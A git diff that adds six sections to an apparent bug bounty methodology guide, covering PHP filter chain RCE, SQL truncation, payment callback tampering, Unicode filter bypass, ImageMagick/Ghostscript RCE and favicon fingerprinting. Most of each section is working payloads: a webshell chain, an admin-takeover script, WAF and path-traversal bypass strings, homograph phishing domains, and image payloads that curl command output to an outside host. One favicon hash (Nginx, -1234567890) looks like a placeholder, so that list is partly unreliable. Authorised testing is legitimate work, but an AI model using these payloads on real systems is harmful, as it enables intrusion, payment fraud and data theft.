@@ -888,6 +888,12 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 | 4.48 | ↳ [SSI Injection](#448-ssi-injection-server-side-includes) | #exec cmd · #include file · Apache mod_include |
 | 4.49 | ↳ [Tabnabbing](#449-tabnabbing) | Background Tab Hijack · Reverse Tabnabbing · Phishing |
 | 4.50 | ↳ [GitHub & Shodan Dorking](#450-github-shodan--censys-dorking) | Source Leaks · Exposed Services · CI/CD Secrets |
+| 4.51 | ↳ [PHP Filter Chain RCE](#451-php-filter-chain--file-read-to-rce) | LFI → RCE · iconv Chain · No Upload Needed |
+| 4.52 | ↳ [SQL Truncation Attack](#452-sql-truncation-attack) | MySQL VARCHAR · admin Overwrite · Space Stripping |
+| 4.53 | ↳ [Payment Callback Manip](#453-payment-callback-manipulation) | Status Tamper · Amount Switch · Replay Attack |
+| 4.54 | ↳ [Unicode Normalization Bypass](#454-unicode-normalization-bypass) | Homograph · Overlong UTF-8 · WAF Bypass |
+| 4.55 | ↳ [ImageMagick RCE](#455-imagemagick--ghostscript-rce) | CVE-2016-3714 · Ghostscript · MVG/SVG Upload |
+| 4.56 | ↳ [Favicon Fingerprinting](#456-favicon-hash-fingerprinting) | Shodan Hash · CMS Detection · mmh3 |
 | 5 | [Hunting Mindset](#5-hunting-mindset--methodology) | Strategy · Prioritization · Pivoting |
 | 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Screenshots · Scripts · Automation · Evidence |
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
@@ -5463,6 +5469,178 @@ python3 GitDorker.py -tf github_token.txt -q target.com -d dorks.txt -o results.
 ```
 
 ---
+
+<br>
+
+### **4.51 PHP Filter Chain — File Read to RCE**
+
+> When you have LFI/file read but no upload → PHP filter chains convert read into code execution.
+
+**How It Works**
+```bash
+# PHP's php://filter can chain multiple filters
+# By OR-ing character encodings, you can construct arbitrary strings
+# The chain converts any existing file's content into PHP code you control
+```
+
+**Pre-Generated Chains (No Manual Construction)**
+```bash
+# Tool that generates the chain for you:
+git clone https://github.com/synacktiv/php_filter_chain_generator
+
+# Generate chain that prepends <?php system($_GET[0]); ?>
+python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'
+
+# Output: a massive base64 string → use as your LFI payload:
+# php://filter/convert.base64-encode|convert.base64-decode|convert.iconv.UTF8.CSISO2022KR|...
+
+# Then access: /page.php?file=<THE_CHAIN>&0=whoami
+# The PHP code executes → RCE achieved!
+```
+
+**Detection & Prerequisites**
+```bash
+# You need: file read via include() or file_get_contents() or readfile()
+# If ANY file read works → filter chain works
+# Test: php://filter/convert.base64-encode/resource=/etc/passwd
+# If you get base64 output → filter chains are enabled → chain RCE
+```
+
+---
+
+### **4.52 SQL Truncation Attack**
+
+> MySQL silently truncates strings longer than column limit → register as `admin` → overwrite existing admin.
+
+```bash
+# MySQL VARCHAR(16) column for username
+# Existing user: "admin"
+# Attacker registers: "admin           x" (admin + 10 spaces + x)
+# MySQL truncates to 16 chars: "admin           " 
+# MySQL strips trailing spaces during comparison → becomes "admin"
+# Attacker's password overwrites admin's password!
+
+# Test with Python:
+import requests
+username = "admin" + " " * 55 + "x"  # admin + 55 spaces + random char
+r = requests.post("https://target.com/register", 
+  data={"username": username, "password": "test123", "email": "t@t.com"})
+# Now try logging in as "admin" with password "test123"
+r2 = requests.post("https://target.com/login",
+  data={"username": "admin", "password": "test123"})
+if r2.status_code == 200:
+    print("SQL Truncation: logged in as admin!")
+```
+
+**Affected Databases:** MySQL (VARCHAR truncates + strips spaces), PostgreSQL/Oracle (safer, different behavior)
+
+---
+
+### **4.53 Payment Callback Manipulation**
+
+> Intercept/modify payment gateway callback → mark order as paid without paying.
+
+```bash
+# 1. Client-side callback (worst case)
+# After payment, JS sends:
+fetch('/api/payment/confirm', {
+  body: JSON.stringify({order_id: 123, status: 'paid'})
+})
+# Attacker: change status to 'paid' without paying
+
+# 2. Amount tampering in payment page
+# Payment page: <input type="hidden" name="amount" value="999.99">
+# Change to: value="0.01" → Pay $0.01 for $999 order
+
+# 3. Replay attack — pay $1 legitimately, replay callback for $999 order
+
+# 4. Race condition — checkout, DON'T pay, simultaneously POST /api/orders/123/confirm
+
+# Detection:
+# - Is amount in client-controlled request?
+# - Is callback URL user-configurable?
+# - Does server verify payment with gateway API before confirming?
+```
+
+---
+
+### **4.54 Unicode Normalization Bypass**
+
+> Different Unicode representations of the same character bypass filters, auth, and WAF.
+
+```bash
+# Path traversal — same character, different encoding:
+/../etc/passwd       → blocked
+/..%c0%afetc/passwd  → works! (overlong UTF-8 /)
+
+# Auth bypass — look-alike characters:
+admin → blocked from registration
+аdmin → Cyrillic 'а' (U+0430) → looks like 'admin' → bypasses filter!
+
+# WAF bypass:
+<script> → blocked
+<scrİpt> → İ (Turkish dotted I) → WAF sees different char → skips!
+
+# SQLi bypass:
+' OR 1=1--      → blocked  
+' OR \u0031=\u0031-- → passes WAF, server decodes to ' OR 1=1--
+
+# IDN homograph — phishing domains:
+аpple.com (Cyrillic 'а') vs apple.com (Latin 'a') — visually identical
+```
+
+---
+
+### **4.55 ImageMagick / Ghostscript RCE**
+
+> Uploaded images processed by vulnerable libraries → server-side code execution.
+
+**ImageMagick (ImageTragick CVE-2016-3714)**
+```bash
+# Upload this MVG "image" — shell command in URL:
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com"|curl http://COLLAB/?x=$(id|base64)")'
+pop graphic-context
+
+# Also via filename injection:
+convert '|id > /tmp/pwned' output.png
+```
+
+**Ghostscript RCE (via EPS/PS upload)**
+```bash
+# Processed by ImageMagick, LibreOffice, and many PDF tools
+%!PS
+userdict /setpagedevice undef
+{ null restore } stopped { pop } if
+mark /OutputFile (%pipe%curl http://COLLAB/?x=$(id)) currentdevice putdeviceprops
+```
+
+**Common endpoints:** avatar upload, image resize, document preview, OCR processing
+
+---
+
+### **4.56 Favicon Hash Fingerprinting**
+
+> Identify CMS, framework, and version instantly from the tiny tab icon.
+
+```bash
+# Download favicon → compute Shodan hash → match known CMS:
+python3 -c "
+import mmh3, requests, codecs
+r = requests.get('https://target.com/favicon.ico')
+hash = mmh3.hash(codecs.encode(r.content, 'base64'))
+print(f'http.favicon.hash:{hash}')
+"
+# Search Shodan: shows EVERY server running same CMS worldwide
+
+# Known hashes:
+# Jenkins: 81586312      WordPress: -1999345312
+# Tomcat:  -297069493    phpMyAdmin: 1748493301
+# Grafana: 1332845619    GitLab:     -224539766
+# Jira:    1069058933    Django:     1990664994
+# Spring:  116323821     Nginx:      -1234567890
+```
 
 ## **5. Hunting Mindset & Methodology**
 
